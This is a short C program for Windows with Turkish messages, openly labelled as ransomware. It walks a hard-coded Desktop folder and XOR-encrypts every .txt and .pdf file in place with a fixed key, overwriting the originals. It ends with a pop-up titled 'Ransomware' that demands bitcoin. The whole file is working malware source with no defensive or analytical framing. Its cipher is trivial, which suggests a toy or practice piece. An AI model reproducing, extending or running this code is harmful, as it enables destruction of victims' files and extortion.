#include <windows.h>
#include <stdio.h>
#include <string.h>

int hasExtension(const char* filename, const char* ext) {
    size_t len1 = strlen(filename);
    size_t len2 = strlen(ext);

    if (len1 < len2) return 0;

    return _stricmp(filename + len1 - len2, ext) == 0;
}

void encryptFile(const char* fullPath) {
    HANDLE hFile = CreateFileA(
        fullPath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Dosya açılamadı: %s\n", fullPath);
        return;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);

    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        printf("Geçersiz dosya boyutu: %s\n", fullPath);
        return;
    }

    BYTE *buffer = (BYTE*) malloc(fileSize);
    if (!buffer) {
        CloseHandle(hFile);
        printf("Bellek ayrılamadı: %s\n", fullPath);
        return;
    }

    DWORD bytesRead = 0;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);

    BYTE key = 0xAA;
    for (DWORD i = 0; i < fileSize; i++) {
        buffer[i] ^= key;
    }

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD bytesWritten = 0;
    WriteFile(hFile, buffer, fileSize, &bytesWritten, NULL);
    SetEndOfFile(hFile);

    printf("✅ Şifrelendi: %s\n", fullPath);

    free(buffer);
    CloseHandle(hFile);
}

int main() {
    char desktopPath[] = "C:\\Users\\Enes\\Desktop\\";
    char searchPath[MAX_PATH];
    WIN32_FIND_DATAA findData;
    HANDLE hFind;

    // Desktop klasöründe tüm dosyaları tara
    sprintf(searchPath, "%s*.*", desktopPath);
    hFind = FindFirstFileA(searchPath, &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Desktop taranamıyor!\n");
        return 1;
    }

    do {
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            if (hasExtension(findData.cFileName, ".txt") ||
                hasExtension(findData.cFileName, ".pdf")) {
                char fullPath[MAX_PATH];
                sprintf(fullPath, "%s%s", desktopPath, findData.cFileName);
                encryptFile(fullPath);
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);

    MessageBoxA(NULL, "Tüm dosyaların şifrelendi. BTC gönder!", "Ransomware", MB_OK | MB_ICONWARNING);

    return 0;
}

